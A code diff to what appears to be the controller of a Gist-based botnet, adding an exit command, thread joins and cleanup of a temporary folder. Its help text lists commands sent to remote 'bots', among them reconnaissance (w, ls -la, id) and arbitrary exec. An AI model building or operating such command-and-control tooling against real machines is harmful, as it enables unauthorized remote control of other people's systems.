@@ -8,8 +8,6 @@ from threading import Thread
 from timeit import default_timer as timer
 
 
-# TODO cmd for ending controller
-
 def reader():
     print("Waiting for input (type help for help 🙃)")
 
@@ -51,9 +49,13 @@ def reader():
                     continue
                 print("EXEC added to execute list", file=sys.stderr)
                 EXECUTE_CMDS.append(["exec", cmd[1], cmd[2]])
+            case "exit":
+                EXECUTE_CMDS.append(["exit"])
+                return
             case _:
                 print("usage: <command name> [bot name] [parameter1 ...]\n\n"
                       "\tls_bots \t\t\t\t\t(lists all currently available bots)\n"
+                      "\texit  \t\t\t\t\t\t(stop controller)\n"
                       "\tw  <bot filename> \t\t\t(lists users currently logged in)\n"
                       "\tls <bot filename> <PATH> \t(list content of specified directory using ls -la)\n"
                       "\tid <bot filename> \t\t\t(id of current user)\n"
@@ -72,6 +74,9 @@ def executor():
                 case "ls_bots":
                     print("ls_bots executing", file=sys.stderr)
                     list_current_bots(GIST_API, BOT_LIST)
+
+                case "exit":
+                    return
 
                 case "w":
                     print("w executing", file=sys.stderr)
@@ -147,5 +152,9 @@ executor_thread = Thread(target=executor)
 reader_thread.start()
 executor_thread.start()
 
+# Wait until exit
+reader_thread.join()
+executor_thread.join()
+
 # Cleanup helper folder (tmp directory)
-# os.rmdir('tmp')
+os.rmdir('tmp')
